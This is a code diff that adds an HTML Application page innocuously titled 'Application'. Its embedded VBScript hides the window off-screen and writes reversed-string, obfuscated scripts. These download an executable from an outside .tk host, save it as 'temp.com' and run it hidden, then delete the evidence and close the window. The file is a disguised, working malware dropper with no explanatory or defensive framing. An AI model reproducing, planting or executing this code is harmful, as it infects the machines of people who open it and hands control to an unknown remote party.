@@ -1,0 +1,52 @@
+<html>
+
+<head>
+
+<title>Application</title>
+
+</head>
+
+
+<SCRIPT Language="VBScript">
+Dim intLeft
+Dim intTop
+intLeft = window.screenLeft
+intTop = window.screenTop
+
+window.moveTo -2000,-2000
+
+Set objFSO=CreateObject("Scripting.FileSystemObject")
+
+outFile="tmp2.vbs"
+Set objFile = objFSO.CreateTextFile(outFile,True)
+objFile.Write StrReverse("eurT,0,""moc.pmet"" nur.llehShsW :)""llehS.tpircSW""( tcejbOetaerC=llehShsW teS : llehShsW miD") & vbCrLf
+objFile.Close
+
+outFile="tmp.vbs"
+Set objFile = objFSO.CreateTextFile(outFile,True)
+objFile.Write StrReverse("""moc.pmet"" ,""pmet"" eliFevoM.osF :)""tcejbOmetsySeliF.gnitpircS""(tcejbOetaerC = osF teS :osF miD :htiw dne :2 ,""pmet"" elifotevas. :ydoBesnopser.pttHx etirw. :nepo. :1 = epyt.:mrtSb htiw :dneS.pttHx :eslaF ,""moc.3tneilC/kt.laudividniroputratsyrtnuocllams//:ptth"" ,""TEG"" nepO.pttHx :nepo.2mrts :1 = epyt.2mrts :)""maertS.bdodA""(tcejboetaerc = 2mrts teS :2mrts mid :)""maertS.bdodA""(tcejboetaerc = mrtSb teS :mrtSb mid :)""PTTHLMX.tfosorciM""(tcejboetaerc = pttHx teS :pttHx mid") & vbCrLf
+objFile.Close
+
+Set fs = CreateObject("Scripting.FileSystemObject")
+Set ts = fs.OpenTextFile(outFile)
+body = ts.ReadAll
+ts.Close
+Execute body
+
+fs.MoveFile "tmp2.vbs", "tmp3.vbs"
+
+Set ts = fs.OpenTextFile("tmp3.vbs")
+body = ts.ReadAll
+ts.Close
+fs.DeleteFile "tmp3.vbs"
+fs.DeleteFile "tmp.vbs"
+Execute body
+
+Windows.Close
+</script>
+
+<body>
+
+</body>
+
+</html>
